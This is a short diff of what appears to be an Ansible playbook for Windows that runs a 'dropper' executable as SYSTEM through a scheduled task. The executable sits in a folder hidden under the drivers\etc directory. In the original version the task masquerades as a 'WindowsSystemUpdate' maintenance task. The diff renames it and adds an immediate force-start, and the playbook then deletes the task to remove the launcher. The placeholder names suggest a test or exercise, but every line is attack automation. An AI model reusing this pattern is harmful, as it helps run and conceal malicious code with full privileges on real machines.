@@ -14,8 +14,8 @@
 
     - name: Execute dropper as SYSTEM
       win_scheduled_task:
-        name: "WindowsSystemUpdate"
-        description: "Standard system maintenance task"
+        name: "PleaseDontRun"
+        description: "Please run this"
         actions:
           - path: C:\Windows\System32\Drivers\etc\VERY_BAD_SOFTWARE\dontrun.exe
         triggers:
@@ -25,7 +25,10 @@
         state: present
         enabled: yes
 
+    - name: Force start the task immediately
+      win_shell: Start-ScheduledTask -TaskName "PleaseDontRun"
+
     - name: Delete the launcher
       win_scheduled_task:
-        name: "WindowsSystemUpdate"
+        name: "PleaseDontRun"
         state: absent
